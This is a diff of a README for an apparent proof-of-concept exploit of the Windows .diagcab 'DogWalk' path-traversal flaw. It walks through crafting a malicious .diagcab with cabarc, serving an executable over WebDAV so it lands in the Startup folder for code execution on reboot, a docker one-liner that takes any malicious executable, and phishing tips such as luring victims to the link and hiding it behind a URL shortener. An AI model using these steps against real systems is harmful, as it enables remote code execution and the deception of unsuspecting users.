@@ -34,13 +34,20 @@ So, basically what we need is:
 
 1. The victim will visit a link (phishing, social engineering, or whatever) that will download the `.diagcab` file
 
-*(💡 use `Content-type: application/octet-stream`response header to make the Browser automaticaly downloading the file when browsing the url)*
+<sup>*(💡 use `Content-type: application/octet-stream` response header to make the Browser automaticaly downloading the file when browsing the url)*</sup>
 
 2. The victim click on the file download (could easily/accidentaly happen by just clicking on the browser download folder)
 3. The cab file loads the webdav malicious executable -> ***(path transversal)*** downloaded in Start up menu
 4. The user restart his device -> ***(RCE)***
 
 ## Let's get it
+
+If you are too lazy to do the step by step, the one liner:
+```shell
+docker run -it --rm --net host --cap-drop=all --cap-add=dac_override --user $(id -u):$(id -g)  ariary/dogwalk  [MALICIOUS_EXE_FILE]
+```
+
+Otherwise:
 
 ### 🔨 Craft the  `.diagcab` file
 
@@ -58,13 +65,22 @@ cabarc.exe n hotfix895214.diagcab custom.diagcfg
 # run it on windows (or with wine). If you do not find carbarc.exe use http://jc.bellamy.free.fr/download/cabarc.exe or http://download.microsoft.com/download/platformsdk/cab/2.0/w98nt42kmexp/en-us/Cabsdk.exe
 ```
 
+Finally, move it in the `./webdav/diagcab-webdav-poc/config` directory
+
 ### 🏗️ Set up the server
 
-Put the executable you want to transfer on victim machine within `./webdav/malicious` folder... *(Here we use the classic `calc.exe`)*
+Put the executable you want to transfer on victim machine within `./webdav/malicious` directory... <sup>*(Here we use the classic `calc.exe`)*</sup>
 
 ...And launch the server:
 ```
+cd ./webdav/diagcab-webdav-poc/
 perl diagcab-webdav-poc.pl
 ```
 
+The malicious `.diagcab` is available at `https://[WEBDAV_URL]/config/hotfix895214.diagcab`. You now have to lure a victim to click on this link.
+
+<sup>*(💡you can use URL shortener to make it appears less suspicious)*</sup>
+
 ### 👁️ Wait and see...
+
+
